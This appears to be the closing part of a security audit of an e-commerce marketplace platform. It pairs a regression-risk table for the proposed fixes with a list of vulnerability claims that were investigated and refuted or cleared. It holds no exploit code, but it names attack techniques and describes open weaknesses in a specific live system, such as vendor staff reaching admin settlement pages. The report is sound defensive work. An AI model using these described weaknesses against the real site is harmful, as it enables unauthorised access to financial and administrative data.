**Every recommendation in this report was written to preserve existing behaviour.** Specifically, and by design: no route URL, HTTP method or parameter shape changes; no controller or action is renamed; no view, menu item, form field or flash message is removed except the one dead "Remember me" checkbox (I4) and the dead `sessions` DELETE (H1), neither of which any code reads; no API response envelope, field name or status code changes for a valid request; no database table, column or index is dropped or renamed (only indexes added); no session, login or impersonation flow is restructured; no cron command, spark command or CLI entry point changes; no third-party integration (PayU, Razorpay, Firebase, Google Maps, S3, SMTP) changes its contract; no permission code is renamed or removed and no role loses a grant except where that grant was the defect; no upload path, storage layout, filename scheme or media URL changes; no report column or export format changes except the CSV text-marker prefix on cells that would otherwise be evaluated as formulas; and the mobile API keeps working with **tokens already issued**, which is why M6's `pwd` check is explicitly nullable-tolerant.

**That said — the following recommendations carry real risk of breaking existing functionality. This list is exhaustive and is not softened.**

| # | Recommendation | The risk | Mitigation |
|---|---|---|---|
| 1 | **H11 — push coupon discount down to sub-orders** | **High.** Changes stored money on every new couponed order. `admin/reports/gst` totals step down on deploy day; vendor settlement amounts rise; invoice PDFs generated from `sub_orders` show the discounted taxable value. Historical orders keep their existing (wrong) rows, so reports straddling the deploy date will look discontinuous. | Get the accounting owner's sign-off **before** shipping. Verify the invoice template does not also subtract a printed discount. Do **not** backfill without a decision. Ship the strictly-additive `discount_total` write first if the decision will take time — it makes the drift auditable at zero risk. |
| 2 | **C1 — rotate the S3 keys** | **Medium.** Between updating `aws_settings` and `s3_storage/.env`, every signed media request fails: uploads and private-media reads break. `putBytes()` fails soft (falls back to local), but `presignGet()` fails visibly — existing S3-backed assets 404. | Do both edits back to back, off-peak. Run the admin S3 self-test **before** deleting the old key at the provider. Have the old key ready to re-instate. |
| 3 | **M9 — HSTS + https redirect** | **Medium, and partly irreversible.** HSTS cannot be revoked faster than its max-age. A lapsed certificate on any hostname becomes a hard outage rather than a warning. If TLS terminates on a proxy forwarding over http, the redirect rule loops the entire site. An ACME http-01 challenge path would break. | `max-age=2592000` (30 days), **no** `includeSubDomains`, **no** `preload`. Audit certificate coverage and renewal across every hostname in `$allowedHostnames` first. Verify what the front end sends (`curl -I http://…` and inspect what the origin receives) — Cloudflare Flexible SSL will loop. Add `RewriteCond %{REQUEST_URI} !^/\.well-known/` if your ACME client uses http-01. Enable one hostname at a time. |
| 4 | **H4 — flip `auth.enforcePrincipalType`** | **Medium.** Any account whose `users.principal_type` is mislabelled relative to the panel its owner uses daily is redirected away and effectively locked out of their normal work. | Ship C2 and M16 first. Review a **full traffic day** of "would block" notices and confirm every hit is genuine cross-panel access. Flip on staging, then production. Rollback is env-only, no deploy. |
| 5 | **H3 — owner gates on the vendor API financial/staff endpoints** | **Medium.** If the shipped app shows Settlements/Commission/GST/Staff tabs to non-owner staff today, those screens start returning 403 on existing installs. | Confirm with the app team whether the tabs are already hidden for staff logins. If not, ship with an app-side hide, or return an empty collection for the *list* endpoints so screens render empty rather than erroring. |
| 6 | **H3 part 2 — applying `perm:` to existing routes** | **Medium.** Any role missing the named permission code loses the endpoint outright, and the seeded grants have never been validated against live traffic. | Do **not** retrofit onto shipped mobile routes in one commit. New/edited routes first, one group at a time, log-only before enforcing. |
| 7 | **M8 — `regenerateDestroy = true`** | **Medium, and intermittent.** A request already in flight when the ID rotates finds its session file gone and is treated as signed out. This app fires background AJAX against authenticated routes (vendor order-detail heartbeat, rider location ping). Hard to reproduce on demand. | Stage it and watch for unexpected `login` redirects across a full day. If they appear, prefer raising `$timeToUpdate` over reverting. Step 1 (`regenerate(true)` at sign-in) is Low risk and can ship alone. |
| 8 | **M20 — cap the admin product list/export at 5,000 rows** | **Medium.** `?per_page=all` and the CSV export silently truncate. If an operator relies on the export for a full catalogue dump they get an incomplete file with no warning. | Check `SELECT COUNT(*) FROM products WHERE deleted_at IS NULL` first — if the catalogue is under the cap today, nothing changes. Add a visible "truncated" line to the CSV, or paginate the export with an offset parameter. |
| 9 | **M11 — `party_type` predicate** | **Medium.** If any pre-existing `vendors` row has a NULL or empty `party_type`, that vendor is silently locked out of their own panel **and** their mobile app. | Run `SELECT party_type, COUNT(*) FROM vendors WHERE deleted_at IS NULL GROUP BY party_type;` and confirm only 'vendor' and 'manufacturer' with no NULLs. Do not deploy until it is clean. |
| 10 | **M1 — enforcing the private-media owner check** | **Medium.** `mayReadPrivate()` returns false for `owner_type` values it does not enumerate (`shop`, `invoice`, `credit_note`, `export`), and the platform branch requires `media.view`, which a `finance` role does not hold. Legitimate viewers would 404. | Ship **log-only** (the fix is written that way). Run the `owner_type × visibility` census, review a traffic day of "would block" lines, widen the predicate for every real combination, then flip the env flag. |
| 11 | **H7 / M18 — `FOR UPDATE` on inventory and stock batches** | **Medium.** Converts silent overselling into serialised waits and, under load, `innodb_lock_wait_timeout` — which surfaces as a failed checkout or a failed POS sale. `consumeBatches()` is on the POS hot path. | Measure POS transaction duration first. Sort cart lines by `variant_id` to make lock order deterministic. Watch `SHOW ENGINE INNODB STATUS` during a parallel soak before and after. |
| 12 | **H8 — conditional coupon UPDATE** | **Medium.** A checkout racing to exhaustion now *fails* rather than placing. The mobile API currently drops an invalid coupon silently, so an app order would fail outright where it previously placed un-discounted. | Decide deliberately: roll back (fails), or set `$pct = 0` and continue (places un-discounted). The customer sees a generic retry unless you thread a reason through the `?string` return. |
| 13 | **M15 — vendor staff API rewrite** | **Medium.** `VendorStaffRepository` keys staff by `vendor_staff.id`, not `users.id`, so `PUT/DELETE /api/v1/vendor/staff/{id}` changes meaning and a live app calling it with a user id would 404. | Take the **translation** option (`SELECT id FROM vendor_staff WHERE user_id = ? AND vendor_id = ?` before delegating) so the wire contract is preserved exactly. Check access logs — since the shop-assignment writes currently throw, these endpoints are probably unused, but confirm rather than assume. |
| 14 | **M27 — reconciled delivery transition map** | **Medium.** The union legalises three transitions for admins and two for riders that one path currently forbids. If any of those five is genuinely meant to be forbidden, this fix removes that restriction. | Confirm the intended rules with operations **before** shipping. Do not assume the union is right just because it is the safe merge. |
| 15 | **M29 step 2 — box/spout → openspout** | **Medium.** openspout 4.x renamed entity/style classes; the importer ingests bulk catalogue data, so a silent parsing change (date coercion, empty rows, sheet order) corrupts product records rather than erroring loudly. | Needs dependency sign-off. Read both Import classes end to end, not just the `use` lines. Round-trip a **real customer XLSX** and diff the resulting `import_jobs` rows and created products against a pre-swap run. |
| 16 | **L10 — `GstCalculator` on `Money`** | **Medium.** Tax arithmetic on the checkout path. Line values may move by up to one paisa, so new orders will not tie out to spreadsheets built from old ones. `Money::of()` throws on scientific notation, and callers stringify floats — an exception inside `place()` rolls the whole order back. | The `norm()` input guard is **not optional**. Table-test the full amount × rate matrix. Compare `admin/reports/gst` for a **closed historical period** before and after (must be identical). Do not touch `PurchaseInvoiceService` in the same commit. |
| 17 | **H6 / H9 — adding `throttle:` to public routes** | **Medium.** A chatty mobile client legitimately exceeding the limit starts getting 429s. `App::$proxyIPs` is `[]`, so **if a CDN or proxy sits in front, every request shares one bucket** and the limit behaves nothing like intended. | Determine whether an edge exists **before** enabling. Set thresholds from real access-log rates, not guesses. Ship log-only first per the project convention. |
| 18 | **L13 — `Cross-Origin-Resource-Policy: same-site`** | **Medium.** Blocks other origins embedding our resources — including any partner site, marketplace feed or email client rendering an `<img>` from our domain. COOP `same-origin` can break a popup that talks back via `window.opener`. | Use `cross-origin` for CORP if any integration hotlinks Shiplore images. Verify the PayU and Razorpay return flows (they are full-page redirects here, so COOP should be fine — confirm anyway). |
| 19 | **M3 — attachment-forcing non-inline media types** | **Low, but visible.** A vendor who today previews a `.txt` or `.csv` in-tab now gets a download. | Acceptable; mention it in release notes. Allow-listed image/PDF/video/audio types are unaffected. |
| 20 | **M4 — `safeKey()` extension allow-list** | **Low, with one trap.** `safeKey()` is also on the **read** and **delete** paths, so any historical `object_key` with an extension outside the list becomes unreadable. | Run the `media_assets` extension census query **before** deploying and add any missing extensions to `SAFE_EXT`. |
| 21 | **M10 — CSP report sink** | **Low as written, catastrophic if mis-sequenced.** Adding `reportURI` is harmless. **Flipping `$reportOnly = false` in the same change would break the admin panel instantly** — it relies on inline `<script>` and inline handlers. | One phase per commit, as the project's own convention requires. Add the sink; collect a traffic day; add nonces; only then enforce. Watch log volume on day one (public unauthenticated POST). |
| 22 | **L8 — prefix `LIKE` on the audit filter** | **Low, but semantic.** Searching `login` would no longer match `auth.login`. | Confirm with whoever uses the screen. If substring search is required, take the date-bounded variant instead and relabel the field. |
| 23 | **L9 — `canRefund()` guard** | **Low.** Completed → failed stops working. | Check for an operational runbook that relies on flipping a completed refund back to correct a mistake — that workflow needs an explicit audited reversal action, not an unguarded write. |
| 24 | **M12 — price-list delete scoping** | **Low, with an assumption.** If any price list is intentionally shared across vendors (a platform-wide campaign), the vendor who created it can no longer expire it. | Confirm no shared lists exist. If they do, narrow the check to delete only that vendor's items rather than expiring the list. Also confirm `price_list_items`/`price_tiers` carry `variant_id`. |
| 25 | **M13 / L1 — shop scoping on transfers and PO receipt** | **Low, workflow-dependent.** A staffer who informally processes all branches' transfers or POs from one login now gets "not found". | Query for such logins first. If one exists, **assign that user to the relevant shops** rather than weakening the check. |
| 26 | **M28 — `composer install --no-dev`** | **Low.** Removes tooling from the box. | Confirm nothing in the production request path invokes it (nothing does; `tests/` is web-denied and CLI-only). Run `composer test` before the redeploy. Keep `assets/vendor/` (bootstrap/jquery) readable — it is a different directory from `vendor/`. |
| 27 | **L12 — `MasterRepository` + audit** | **Low, with a new side effect.** The audit call writes `audit_logs` rows that did not exist before. | Verify `AuditWriter::log()`'s expected shape against existing callers; confirm `admin/audit-logs` renders a bare table name as `entity_type` without erroring. Migrate `toggle()` in the same pass or the trait's two halves will use different persistence paths. |
| 28 | **M22 — cart line cap** | **Low.** Carts over 100 distinct variants silently lose the overflow. | Check `SELECT MAX(c) FROM (SELECT order_id, COUNT(*) c FROM order_items GROUP BY order_id) t`. Prefer an explicit `VALIDATION_ERROR` over silent truncation — more honest, though it changes the API's failure surface. |
| 29 | **M25 — `nearby()` SQL cap** | **Low.** If a location genuinely has more shops in the ±0.5° box than the cap, the excess is dropped **in arbitrary order** (rows are unordered). | Check the densest-city shop count. If well under 500, the cap is inert and purely defensive. |
| 30 | **M21 / M20 / M24 — new indexes** | **Low, with an operational window.** Index maintenance cost on the order-placement hot path; the `ALTER` itself takes time on a large table. | MariaDB 10.11 adds secondary indexes online, but run in a quiet window. `ADD INDEX IF NOT EXISTS` is MariaDB-only syntax — fine here, not portable to MySQL 8. |
| 31 | **M24 — 300s monline caches** | **Low.** Manufacturer and category filter counts become up to five minutes stale. | Confirm nobody treats those sidebar counts as authoritative. |
| 32 | **M6 — the `pwd` claim** | **Low on deploy, user-visible after.** Existing tokens are untouched (the `!== null` guard is the point). But once tokens carry the claim, **a password change signs the user out of the mobile app**. | Intended behaviour — put it in release notes. Ship step 1 and step 2 in that order; step 1 alone is a no-op. |

Everything not listed in this table is behaviour-preserving to the best of my ability to determine, and each such finding's own **Regression Risk** section states the specific reasoning and the specific pre-flight check.

---

## 12. Investigated and cleared

These were raised, checked hard, and are **not** issues. Listed so nobody re-opens them.

**Refuted outright**

- **"The main `.env` is tracked and leaks `jwt.secret`"** (the audit brief's premise). Three lanes independently confirmed `git ls-files --error-unmatch .env` errors with "did not match any file(s) known to git", and no `.env` exists on disk at the repo root. The only tracked env file is `s3_storage/.env` (C1). The tracked root `env` is CI4's shipped template with every sensitive line commented out and no `jwt.secret` at all. **No `jwt.secret` is in version control.** (The production secret's *entropy* remains unverified — see I2.)
- **"monline PO receive silently marks the order received when the stock credit fails."** Refuted by framework semantics: `BaseConnection::handleTransStatus()` sets `transStatus=false` whenever `transDepth !== 0`, `$transStrict` is `true` and never disabled, so the flag survives the inner rollback, the outer `transComplete()` performs a real rollback, and the caller returns "Could not record the receipt." None of the cited triggers (duplicate key on `ensureRow`, batch unique collision, deleted variant) produces the claimed outcome. Only the *double-credit race* survives (M17).
- **"`/api/v1/customer/shop-categories` runs a 4-table full-catalogue scan with a per-row EXISTS."** Refuted: `categoryFacets()` checks `_noOtherFilters` first, so a bare `shop_ids` takes the `categoryTreeWithCounts()` branch — join-free, deliberately unpinned for the single-shop case, scoped to one shop's products. Uncached per request but far cheaper than described. H9 stands on `brands()` alone.
- **"A manufacturer can `POST /vendor/products/store` and create ordinary storefront products."** Refuted: `store()` requires a posted shop id present in `allowedShopIds()`, which reads the `shops` table; manufacturer registration inserts the first unit into **`mshops`**, so a manufacturer owns zero `shops` rows and creation fails outright. An escalation still exists via `Vendor\ShopController::create()` first, and storefront visibility remains approval-gated — hence M11 is Medium, not High.
- **"The `?category=` amplification leaves thousands of worker jobs queued."** Refuted for that vector: `FacetCache::store()` DELETEs the queue row for the key it just computed. Only the `lat`/`lng` bucket vector leaves surviving `facet_refresh_queue` rows (still real, still in H6).
- **"Vendor media XSS gives an attacker the admin's session and privileges."** Refuted: `startStaffImpersonation()` swaps both `user_id` and `principal_type`, so during impersonation the session carries **vendor** privileges; `Cookie::$httponly = true` blocks cookie theft; the admin panel is a separate origin with CORS closed. A delayed multi-step chain survives, so the finding stands — at Medium (M3), not High.
- **"Enabling the principal pin permanently traps an admin in an impersonated portal."** Refuted as a trap: `$routes->post('logout', …)` is at `Routes.php:35`, top level, outside every pinned group, so the admin can always log out and sign back in. The real cost is a broken "Return to admin" button and a missing `portal.stop_impersonation` audit row — M16, Medium.
- **"`cancelForReturn` grants a free commission clawback to an unrelated vendor on every refund."** Refuted on the **return** path: `rowsForSubOrder` filters by `sub_order_id` **and** `whereIn('order_item_id', …)`, so the intersection is empty and it returns `skipped`. The real harm there is that the returning vendor's commission is never cancelled. It *is* accurate on the **cancellation** path (`return_id` null → `$itemIds` null → every row of the wrong sub-order reversed). Both are inside H10; the mechanism differs from the original claim.
- **"`PrincipalTypeGateTest` asserts the enforcement flag must stay off in production."** Mis-read: `:82-95` asserts `filter_var()` semantics for falsy inputs. The *rollout contract* is codified at `:56-79` (`testLogOnlyModeNeverBlocks`). Log-only is genuinely the deliberate current state, but not for the reason cited.
- **"The `.shiplore.in` cookie domain is what lets a vendor reach the admin panel."** Refuted as load-bearing: only the `/` entry points are host-scoped (`Routes.php:11-25`); the `admin` group is path-based on every host, so a vendor staffer reaches `vendor.shiplore.in/admin/settlements` **without needing a shared cookie at all**. This makes C2 wider than originally described, not narrower — and it is why narrowing the cookie domain is explicitly *not* the recommended fix.

**Checked and clean**

- **SQL injection.** Swept exhaustively: all 24 `->query()`/`->simpleQuery()` sites parameterised with `?`; ~60 escape-disabled `select/where/orderBy/having/groupBy/set` fragments are compile-time or class constants; user data reaching raw fragments is coerced first (`implode(',', array_map('intval', $ids))`, `preg_replace('/[^a-z0-9_]/', …)`, `sprintf('%.7f', $lat)`); the only user-facing `sort` parameter is a `switch` over a fixed whitelist and `bulkUpdate` maps its column through `match()`. Nothing found.
- **CSRF coverage.** 344 route-level filters; every mutating non-API route covered; the only exceptions are the two hash-verified PayU redirect-backs (annotated as such) and `api/*` routes under `jwtAuth`, which a cross-site form cannot supply. CORS closed. No state-changing GETs. (The *static token* weakness is recorded separately as I3.)
- **JWT algorithm confusion.** `alg: none` and RS256→HS256 do not work — the header is never parsed and the expected signature is always the HS256 HMAC, so any mismatch is rejected by construction. Recorded as I2 for defence in depth only.
- **`SettingsRepository::get()` raw key interpolation.** Injection closed — both arguments pass through `norm()`'s `preg_replace('/[^a-z0-9_.]/i', '', $s)`, which strips quotes and every SQL metacharacter. Flagged inside M30 only as fragile-to-future-edits.
- **`MasterCrud` dynamic table name.** Not injection and not mass assignment — the table comes from a hard-coded `masterSpec()`, `masterCollect()` builds `$data` strictly from a whitelist, and every entry point calls `guard()`. L12 is purely an architectural finding.
- **`admin/master/index.php` malformed attribute.** Not exploitable — `esc($v, 'attr')` hex-encodes space, `=`, `"` and `'`, so no new attribute with a value (and therefore no event handler) can form in the bare attribute-name position. L5 is a correctness defect in a safety prompt only.
- **Mass assignment across the API.** `createProduct`, `updateProduct`, `addPaymentInstrument` and `updateProfile` all build explicit field whitelists. None found.
- **Response leakage.** `MonlineCatalogRepository` never selects `making_price` and gates prices behind an opt-in `$withPrices` flag defaulting false; no endpoint returns `password_hash` or token material.
- **`Admin\BannerController` upload.** Safe — its MIME check precedes `getRandomName()`, so `Mimes::guessExtensionFromType` cannot return an executable extension. (Unlike C3.)
- **SMTP credentials in mail debug output.** Do not reach `printDebugger(['headers'])` — CI4 sends them via `sendData`, not `sendCommand`.
- **`Config\Mimes`.** Stock, unmodified.
- **XLSX import file handling.** Goes through box/spout on the temp path with no `move()` — the dependency's age is the concern (M29), not the handling.
- **`DocumentStorage::safeKey()` traversal handling.** A correct, well-reasoned fix — it *rejects* `..` rather than rewriting it, and the comment explains why the previous sanitiser was exploitable. The remaining gap is the missing extension constraint (M4), not traversal.
- **`MediaService`.** Validates MIME with `finfo` via `File::getMimeType()` (not the client header), derives extensions from a closed map, randomises filenames to UUIDv4 from `random_bytes(16)`, stores under `writable/uploads` rather than the web root, and correctly omits SVG from its image allow-list.
- **`DocumentUploadController::ownsKey()`.** Correct — the trailing slash prevents `vendors/1/` matching `vendors/12/`.
- **Login attempt auditing.** Both success and failure are recorded to `login_attempts` with identifier, IP, UA and reason, with a rolling lockout — on the **web** path. (The API path is H2.)
- **Production error handling.** `display_errors` off in `Boot/production.php`, `.user.ini` and `php.ini`; generic production error view; `Exceptions::$ignoreCodes = [400, 404]` well-justified. *Unverified:* which of `php.ini`/`.user.ini` wins on the live SAPI for a fatal *before* bootstrap — CI4 covers everything after.
- **Wildcard-with-credentials CORS in `.htaccess`.** Already removed; `Config\Cors` is locked down.
- **`Admin\PortalController` impersonation.** Properly gated (the one guard that checks `isPlatform()`), audited, blocks nesting, fails safe on a corrupt stash.
- **`AuditWriter`.** Actor, principal type, impersonator, scope, IP, UA, plus before/after snapshots in `audit_log_details`, hash-chained. Genuinely good.
- **`CapabilityRepository` ignoring `roles.status`.** Real, but no UI can deactivate a role (`Admin\RoleController` only syncs permissions), so nothing is currently reachable. Noted as forward-looking: **if role deactivation is ever added, it will not revoke anything.**